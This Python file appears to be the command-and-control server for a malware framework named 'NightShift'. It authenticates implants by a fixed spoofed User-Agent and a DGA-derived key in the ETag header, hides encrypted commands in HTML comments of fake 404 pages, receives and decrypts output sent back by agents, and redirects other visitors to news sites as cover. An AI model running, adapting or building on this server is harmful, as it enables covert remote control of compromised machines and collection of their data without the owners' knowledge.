#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from datetime import datetime
from aiohttp import web
from nightshift_dga import NightShift_DGA
from nightshift_cipher import NightShift_Cipher

async def CommsCheck(request):
    time_stamp = datetime.now()
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    ns_custom_fof_path = 'ns_custom_fof.txt'
    if (ns_ua_chk == 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.-; Trident/6.0; SLCC2; RSS_Link_Validator/1.9) Edge/12.10158' and ns_et_chk == ns_hsh_key):
        print('[+] {0:s} --> New agent coming online. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Test Sucessful', headers={ 'Server': 'LiteSpeed 3.13.37' })
    else:
        print('[+] {0:s} --> Someone knocking but does not have the goods. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.HTTPFound('https://www.nytimes.com/')


async def Init_Output(request):
    time_stamp = datetime.now()
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    ns_resp_data = await request.read()
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    if (ns_ua_chk == 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.-; Trident/6.0; SLCC2; RSS_FeedParser/0.9) Edge/12.10158' and ns_et_chk == ns_hsh_key):
        ns_resp_data = ns_resp_data.decode('ascii')
        ns_decrypted_data = ns_get_cipher.decrypt(ns_resp_data)
        #print(ns_resp_data)
        #print(ns_decrypted_data)
        print('[+] {0:s} --> New agent initialized. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Initialization Complete, welcome to the nightshift.', headers={ 'Server': 'LiteSpeed 3.13.37' })
    else:
        print('[+] {0:s} --> Someone knocking but does not have the goods. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Ahhhh, what\'s going on?')

async def FourOFour(request):
    time_stamp = datetime.now()
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    if (ns_ua_chk == 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.-; Trident/6.0; SLCC2; RSS_Link_Validator/1.9) Edge/12.10158' and ns_et_chk == ns_hsh_key):
        print('[+] {0:s} --> A Nightshift Agent has requested payload. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        ns_cmd_path = "ns_fof_cmd.json"
        ns_custom_fof_path = 'ns_custom_fof.txt'
        with open(ns_cmd_path, 'r') as ns_cmd_f:
            ns_cmd_f = ns_cmd_f.read()
            ns_cipher_cmd = ns_get_cipher.encrypt(ns_cmd_f)
        with open(ns_custom_fof_path, 'r') as ns_custom_fof_f:
            ns_custom_fof_f = ns_custom_fof_f.read()
            ns_custom_fof_f += '<!--HTMLDOC:'+ns_cipher_cmd+'HTMLDOC>'
        return web.HTTPNotFound(
                    text=ns_custom_fof_f,
                    content_type="text/html"
                    )
    else:
        print('[+} {0:s} --> Someone knocking but does not have the goods. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.HTTPFound('https://www.theverge.com')

async def Post_Output(request):
    time_stamp = datetime.now()
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    ns_resp_data = await request.read()
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    if (ns_ua_chk == 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.-; Trident/6.0; SLCC2; RSS_FeedParser/0.9) Edge/12.10158' and ns_et_chk == ns_hsh_key):
        ns_resp_data = ns_resp_data.decode('ascii')
        #print(ns_resp_data)
        ns_decrypted_data =  ns_get_cipher.decrypt(ns_resp_data)
        #print(ns_decrypted_data)
        print('[+] {0:s} --> A Nightshift Agent has responded with it data output Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.Response(text='NightShift hours recorded', headers={ 'Server': 'LiteSpeed 3.13.37' })
    else:
        print('[+} {0:s} --> Someone knocking but does not have the goods. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Ahhhh, what\'s going on?')

app = web.Application()
app.add_routes([web.get('/rss/get/latest/news', CommsCheck),
                web.post('/rss/political/compass/quiz', Init_Output),
                web.get('/rss/toptech/picks', FourOFour),
                web.post('/rss/celeb/quiz', Post_Output)])

if __name__ == '__main__':
    web.run_app(app)
